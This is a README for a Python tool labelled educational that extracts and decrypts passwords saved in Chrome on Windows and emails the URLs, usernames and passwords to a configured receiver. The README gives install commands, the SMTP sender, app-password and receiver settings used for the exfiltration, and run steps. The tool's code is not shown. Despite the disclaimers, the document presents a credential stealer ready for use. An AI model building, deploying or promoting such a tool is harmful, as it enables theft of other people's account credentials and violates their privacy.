# Password Cracker (Educational Purposes Only)

## ⚠️ Disclaimer
**This project is strictly for educational and research purposes only.** Unauthorized access to computer systems, accounts, or data that you do not own is illegal and punishable by law. The author is not responsible for any misuse of this code. **Use it only on systems you own or have explicit permission to test.**

## 📌 Overview
This script demonstrates how Chrome stores passwords and how they can be retrieved and decrypted. It extracts saved credentials from Chrome's `Login Data` SQLite database and sends them via email.

## 🔧 Features
- Retrieves Chrome's master encryption key.
- Decrypts stored passwords using AES-GCM.
- Extracts URLs, usernames, and passwords.
- Sends extracted data via email.

## 📜 Requirements
- Python 3.x
- Required Python Modules:
  - `os`, `json`, `base64`, `sqlite3`, `shutil`, `smtplib`, `datetime`
  - `email.mime` (built-in)
  - `pycryptodome` (install via `pip install pycryptodome`)
  - `pypiwin32` (install via `pip install pypiwin32`)

## 🚀 Setup & Usage
1. Install dependencies:
   ```bash
   pip install pycryptodome pypiwin32
   ```
2. Update the script with your email credentials:
   ```python
   EMAIL_SENDER = "YOUR-EMAIL"
   EMAIL_PASSWORD = "YOUR GOOGLE APP-PASSWORD"
   EMAIL_RECEIVER = "YOUR RECEIVING EMAIL"
   ```
3. Run the script:
   ```bash
   python script.py
   ```

## 📌 Important Notes
- **Google Chrome encrypts stored passwords using a master key.** This script retrieves and decrypts them for educational purposes.
- **This works only on Windows**, as it relies on `CryptUnprotectData`, a Windows API.
- **Google App Passwords are required** instead of the actual Gmail password for sending emails.

## 🛑 Legal & Ethical Warning
Using this script on unauthorized devices is **illegal** and violates privacy laws. Always get **explicit permission** before testing. This repository is meant **only for educational cybersecurity awareness**.


---
### 🔥 Educational Purpose Only! Be Responsible!

